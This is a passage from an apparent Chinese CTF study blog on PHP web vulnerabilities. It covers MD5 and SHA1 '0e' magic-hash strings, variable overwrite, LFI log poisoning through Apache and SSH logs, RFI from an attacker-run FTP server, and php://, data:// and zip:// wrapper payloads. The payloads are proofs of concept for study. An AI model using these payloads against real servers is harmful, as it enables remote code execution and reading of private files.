                     data-src="/./../../../../images/PHP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/image-20240927011050400.png"
                      alt="image-20240927011050400"
                ></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h4><h5 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h5><ol>
<li>如果MD5值计算结果后开头为0e，则会被认为时科学计数法的先决条件</li>
<li>0e后面全为数字，例如 <code>0e123==0e456</code>，这样的条件就是成立的</li>
</ol>
<p><strong>对应上述的字符串有</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#0e开头的md5()和原值</span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure></div>

<p>这些都是经过一次md5()就可以满足条件了的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/PHP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/image-20240927011543089.png"
                      alt="image-20240927011543089"
                ></p>
<p>下面这些md5(mf5())的也需要了解（他们也满足md5()）</p>
<blockquote>
<p>可能不能得出结果，因为0e开头满足条件1但后面不全为数字，不满足条件2</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#双md5结果仍是0e开头字符串大全</span><br><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">md5(CbDLytmyGm2xQyaLNhWn) =&gt; 0ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line">md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af</span><br><span class="line"></span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">md5(770hQgrBOjrcqftrlaZk) =&gt; 0e689b4f703bdc753be7e27b45cb3625</span><br><span class="line">md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064</span><br><span class="line"></span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br><span class="line">md5(7r4lGXCH2Ksu2JNT3BYM) =&gt; 0e269ab12da27d79a6626d91f34ae849</span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/PHP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/image-20240927012701739.png"
                      alt="image-20240927012701739"
                ></p>
<h5 id="MD4"><a href="#MD4" class="headerlink" title="MD4"></a>MD4</h5><ol>
<li>哈希计算后结果开头为0e</li>
<li>后面全为数字</li>
</ol>
<p><strong>对应上述的字符串有</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0e251288019</span><br></pre></td></tr></table></figure></div>

<h5 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h5><ol>
<li>哈希计算后结果开头为0e</li>
<li>后面全为数字</li>
</ol>
<p><strong>对应上述的字符串有</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">aa3OFF9m</span><br><span class="line">aaO8zKZF</span><br><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br></pre></td></tr></table></figure></div>

<h3 id="PHP变量覆盖漏洞"><a href="#PHP变量覆盖漏洞" class="headerlink" title="PHP变量覆盖漏洞*"></a>PHP变量覆盖漏洞*</h3><p>这里提供一道<a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%8C%E7%AB%A0][2.3.4%20%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90][BJDCTF2020]Mark%20loves%20cat" >练习题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>和<a href="/2024/09/13/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DMark-loves-cat/" title="BJDCTF2020-Mark-loves-cat*">我的WP</a></p>
<blockquote>
<p>建议看完资料后去做一遍，确实是可以加强记忆和理解的</p>
</blockquote>
<p>当出现</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="comment">//其他的能导致变量被覆盖的函数（略）</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure></div>

<p>一旦<code>$cmd</code>变量被覆盖为<code>&quot;whoami&quot;</code>时，就会出现严重的远程命令执行&#x2F;命令注入漏洞</p>
<h4 id="PHP变量覆盖"><a href="#PHP变量覆盖" class="headerlink" title="PHP变量覆盖"></a>PHP变量覆盖</h4><h5 id="变量覆盖的方式"><a href="#变量覆盖的方式" class="headerlink" title="变量覆盖的方式"></a>变量覆盖的方式</h5><ol>
<li><p>单纯的PHP语法导致变量覆盖</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$$test</span>=<span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$hello</span>);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../images/PHP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/image-20240927013555117.png"
                      alt="image-20240927013555117"
                ></p>
<p>原理：<code>$$test=$b</code>实际为<code>$$a=$b</code>，也就是说<code>$hello=$b</code>，<code>b</code>的值赋给了一个新被创造出来的<code>hello</code>变量，导致了不该被输出的<code>world</code>输出了</p>
</li>
<li><p>PHP函数导致变量覆盖</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>([<span class="variable">$a</span>=&gt;<span class="variable">$b</span>]);</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&#x27;hello&#x27;</span>=<span class="string">&#x27;world&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">mb_parse_str</span>(<span class="string">&#x27;hello&#x27;</span>=<span class="string">&#x27;world&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">import_request_variables</span>(<span class="string">&quot;p&quot;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>1.extract()</strong></p>
<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
<p>该函数返回成功设置的变量数目。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="keyword">array</span>,extract_rules,prefix)</span><br></pre></td></tr></table></figure></div>

<p><strong>eg：</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$phone</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GET传参:?name=xiaohua&amp;age=22&amp;phone=112323123</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果:</span></span><br><span class="line"><span class="comment">// xiaohua</span></span><br><span class="line"><span class="comment">// 22</span></span><br><span class="line"><span class="comment">// 112323123</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>2.parse_str()</strong></p>
<p>parse_str() 函数把查询字符串解析到变量中。</p>
<p>注释：<strong>如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</strong></p>
<p>注释：php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span>,<span class="keyword">array</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>eg:</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;name=xiaohua&amp;age=22&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//xiaohua</span></span><br><span class="line"><span class="comment">//22</span></span><br></pre></td></tr></table></figure></div>

<p><strong>3. import_request_variables()</strong></p>
<p>(PHP 4 &gt;&#x3D; 4.1.0, PHP 5 &lt; 5.4.0)</p>
<p> import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中</p>
<p>将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 <a class="link"   href="https://www.php.net/manual/zh/ini.core.php#ini.register-globals" >register_globals <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，但又想用到一些全局变量，那么此函数就很有用。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">import_request_variables</span> ( <span class="keyword">string</span> <span class="variable">$types</span> [, <span class="keyword">string</span> <span class="variable">$prefix</span> ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure></div>

<p><strong>eg:</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span>=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//include &#x27;flag.php&#x27;;</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variables</span>(<span class="string">&#x27;gp&#x27;</span>); <span class="comment">//导入get和post中变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&quot;xiaohua&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag&#123; xiaohua-2020-3-28&#125;&#x27;</span>;</span><br><span class="line">    <span class="comment">// echo $flag.php;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;NO!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">//payload：http://127.0.0.1/test.php?num=xiaohua</span></span><br><span class="line"><span class="comment">//flag&#123; xiaohua-2020-3-28&#125; </span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>PHP配置项导致变量覆盖</p>
</li>
</ol>
<p><code>register_globals</code>:php.ini中的一个配置项，配置为true后传入GET&#x2F;POST参数都会被赋值成变量</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$hello</span>);</span><br><span class="line"><span class="comment">//传入hello=world，最后输出world</span></span><br></pre></td></tr></table></figure></div>

<h3 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h3><h4 id="常见文件包含函数"><a href="#常见文件包含函数" class="headerlink" title="常见文件包含函数"></a>常见文件包含函数</h4><ul>
<li><a class="link"   href="http://www.php.net/manual/en/function.include.php" >include() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://php.net/manual/en/function.include-once.php" >include_once() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://php.net/manual/en/function.require.php" >require() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://php.net/manual/en/function.require-once.php" >require_once() <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p><strong>理清两个不同</strong></p>
<ol>
<li>有once只会包含一次，即使后续再次调用，也没用</li>
<li>require包含文件遇到错误时，程序不会继续往下执行；include包含文件遇到错误时，程序会继续执行下去</li>
</ol>
<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><p><strong>Local File Inclusion ：LFI</strong></p>
<p> 所包含的文件为本地文件</p>
<blockquote>
<p>这里的本地是对于服务器的本地，不是我们自己的电脑</p>
</blockquote>
<p>通过传入参数来访问本地文件，&#x2F;?file&#x3D;flag.php</p>
<p><strong>有价值的文件路径</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/auth.log	#SSH 日志</span><br><span class="line"></span><br><span class="line">/flag	#CTF中的flag路径</span><br><span class="line"></span><br><span class="line">/var/log/apache2/access.log	#Apache日志</span><br></pre></td></tr></table></figure></div>

<h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ol>
<li><p>利用文件上传漏洞，上传一句话执行文件并访问（例如在图片里插入phpinfo代码，将图片上传后访问图片地址）</p>
<p>利用中间件日志文件，请求的时候将请求的payload写作可执行代码（例如<code>?file=&lt;? php phpinfo();?&gt;</code>），这时候这串指令以及保存到日志文件中了，访问Apache日志即可执行代码</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/apache2/access.log</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>利用SSH日志文件，通过SSH连接到目标服务器</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh &#x27;&lt;? php phpinfo();?&gt;&#x27;@HOST</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>执行后文件包含访问服务器</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n 6 /var/log/auth.log</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><strong>若只能包含.php文件则要用到伪协议编码输出文件</strong></p>
<h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p><strong>Remote File Inclusion ：RFI</strong></p>
<p> 所包含的文件为远程文件</p>
<blockquote>
<p>这里的远程是对于本地的，也就是相对于服务器以外的远程文件</p>
</blockquote>
<h5 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h5><p>服务器的php配置项中<code>allow_url_include=On</code></p>
<h5 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h5><p>可以利用的协议有HTTP、FTP、SMB、Webdav</p>
<p><strong>HTTP远程文件包含</strong></p>
<p>在自己或者其他的远程开启HTTP服务的服务器上，写入需要执行的PHP文件，传入参数<code>?file=http://服务器IP/test.txt</code></p>
<p><strong>FTP远程文件包含</strong></p>
<p>在自己或者其他的远程开启FTP服务的服务器上，写入需要执行的PHP文件，传入参数<code>?file=ftp://服务器IP/1</code></p>

  <div class="note p-4 mb-4 rounded-small red">
    <p>这里需要先用Python启动FTP服务（因人而异）</p>

  </div>

<p>提供一个脚本</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pyftpdlib.handlers <span class="keyword">import</span> FTPHandler</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.servers <span class="keyword">import</span> FTPServer</span><br><span class="line"><span class="keyword">from</span> pyftpdlib.authorizers <span class="keyword">import</span> DummyAuthorizer</span><br><span class="line">authorizer=DummyAuthorizer()</span><br><span class="line">handler=FTPHandler</span><br><span class="line">handler.authorizer=authorizer</span><br><span class="line">authorizer.add_anonymous(<span class="string">&#x27;/tmp&#x27;</span>)	<span class="comment">#FTP目录</span></span><br><span class="line">server-FTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">21</span>),handler)</span><br><span class="line">server.serve_forerver()</span><br></pre></td></tr></table></figure></div>

<p>然后再<code>/tmp</code>目录中编写php代码文件</p>
<h3 id="PHP常见伪协议及其用法"><a href="#PHP常见伪协议及其用法" class="headerlink" title="PHP常见伪协议及其用法"></a>PHP常见伪协议及其用法</h3><h4 id="1、php-input"><a href="#1、php-input" class="headerlink" title="1、php:&#x2F;&#x2F;input"></a>1、php:&#x2F;&#x2F;input</h4><p>可以获取POST的数据流</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_include=On</span><br><span class="line">allow_url_fopen-Off/On</span><br><span class="line"></span><br><span class="line">POC:</span><br><span class="line">file =php://input</span><br><span class="line">POST:phpinfo();</span><br></pre></td></tr></table></figure></div>

<h4 id="2、php-filter"><a href="#2、php-filter" class="headerlink" title="2、php:&#x2F;&#x2F;filter"></a>2、php:&#x2F;&#x2F;filter</h4><p>可以获取指定文件的源码，但是当他与包含函数结合是，php:&#x2F;&#x2F;filter流会被当做php文件执行。所以我们一般对其进行编码，让其不执行，从而导致任意文件读取。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_fopen=Off/On</span><br><span class="line">allow_url_include=Off/On</span><br><span class="line"></span><br><span class="line">POC:</span><br><span class="line">?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure></div>

<p><strong>过滤器介绍</strong></p>
<p>在读取文件的时候当解析为php文件时会停止解析被保护，而过滤器可以通过编码将其以编码的形式暴露出来</p>
<p><strong>Base64过滤器</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>

<p>去除html和php标记过滤器</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/string.strip_tags/resource=index.php</span><br></pre></td></tr></table></figure></div>

<p>将内容转为大写</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/string.toupper/resource=index.php</span><br></pre></td></tr></table></figure></div>

<p>将内容转为小写</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/string.tolower/resource=index.php</span><br></pre></td></tr></table></figure></div>

<p><strong>对字符串执行rot13变换</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=string.rot13/resource=index.php</span><br></pre></td></tr></table></figure></div>

<p>将字符串转化为8-bit字符串</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.quoted-printable-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>

<p><strong>对字符串从UTF-8到UTF-7转换</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7/resource=index.php</span><br></pre></td></tr></table></figure></div>

<h4 id="3、zip"><a href="#3、zip" class="headerlink" title="3、zip:&#x2F;&#x2F;"></a>3、zip:&#x2F;&#x2F;</h4><p>可以访问压缩包里的文件。当他与包含函数结合时，zip:&#x2F;&#x2F;流会被当做php文件执行。<br>从而实现任意文件执行。<br>同类型的还有：zlib:&#x2F;&#x2F; 和bzip2:&#x2F;&#x2F;</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件：</span><br><span class="line">必须要zip压缩包（后缀无所谓，文件格式是zip就行）。</span><br><span class="line">allow_url_fopen=Off/On</span><br><span class="line">allow_url_include=Off/On</span><br><span class="line">php &gt;=5.2</span><br><span class="line"></span><br><span class="line">POC:</span><br><span class="line">zip://[压缩包绝对路径]#[压缩包内的文件]</span><br><span class="line">?file=zip://D:\zip.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure></div>

<h4 id="4、phar"><a href="#4、phar" class="headerlink" title="4、phar:&#x2F;&#x2F;"></a>4、phar:&#x2F;&#x2F;</h4><p>和zip:&#x2F;&#x2F;类似<br>绝对路径和相对路径都可以</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件：</span><br><span class="line">必须要zip压缩包（后缀无所谓，文件格式是zip就行）。</span><br><span class="line">allow_url_fopen=Off/On</span><br><span class="line">allow_url_include=Off/On</span><br><span class="line">php &gt;=5.2</span><br><span class="line"></span><br><span class="line">POC:</span><br><span class="line">zip://[压缩包绝对路径]#[压缩包内的文件]</span><br><span class="line">?file=zip://D:\zip.zip/phpinfo.php(与zip://不同之处在于一个是# ，一个是/)</span><br></pre></td></tr></table></figure></div>

<h4 id="5、data"><a href="#5、data" class="headerlink" title="5、data:&#x2F;&#x2F;"></a>5、data:&#x2F;&#x2F;</h4><p>同样类似于php:&#x2F;&#x2F;input</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_fopen=On</span><br><span class="line">allow_url_include=On</span><br><span class="line"></span><br><span class="line">POC:</span><br><span class="line">?file=data://,&lt;?php phpinfo();</span><br><span class="line">?file=data://text/plain,&lt;php phpinfo();</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line">?file=data:text/plain,&lt;php phpinfo();</span><br><span class="line">?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure></div>

<h3 id="PHP代码执行漏洞"><a href="#PHP代码执行漏洞" class="headerlink" title="PHP代码执行漏洞"></a>PHP代码执行漏洞</h3><h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><h5 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h5><p>代码结尾用；结束</p>
<h5 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h5><p>代码结尾不需要；结束</p>
<h5 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h5><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://www.cnblogs.com/xhds/p/12587249.html" >PHP中的变量覆盖漏洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/yao_xin_de_yuan/article/details/108326427" >五种常见的php伪协议 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>data</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>data</tag>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>misc安全WP目录</title>
    <url>/2024/09/18/ctf/writeup/misc/%E7%9B%AE%E5%BD%95/catalogue/</url>
    <content><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>（根据上传顺序以及题目难度进行排序）</p>
<p><a href="#ctfhub">ctfhub</a></p>
<p><a href="#buuctf">buuctf</a></p>
<h2 id="ctfhub"><a href="#ctfhub" class="headerlink" title="ctfhub"></a>ctfhub</h2><h2 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h2><h3 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h3><p><strong><a href="/2024/09/18/ctf/data/misc/%E9%9A%90%E5%86%99%E6%9C%AF/" title="隐写术">参考资料</a></strong></p>
<ol>
<li><a href="/2024/09/18/ctf/writeup/misc/buuctf/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/" title="附加字符串">附加字符串</a></li>
<li><a href="/2024/09/18/ctf/writeup/misc/buuctf/%E5%9B%BE%E7%A7%8D/" title="图种">图种</a></li>
<li><a href="/2024/09/18/ctf/writeup/misc/buuctf/EXIF/" title="EXIF">EXIF</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8D%EF%BC%88LSB%EF%BC%89/" title="最低有效位（LSB）">最低有效位（LSB）</a></li>
<li><a href="/2024/09/19/ctf/writeup/misc/buuctf/%E7%9B%B2%E6%B0%B4%E5%8D%B0/" title="盲水印">盲水印</a></li>
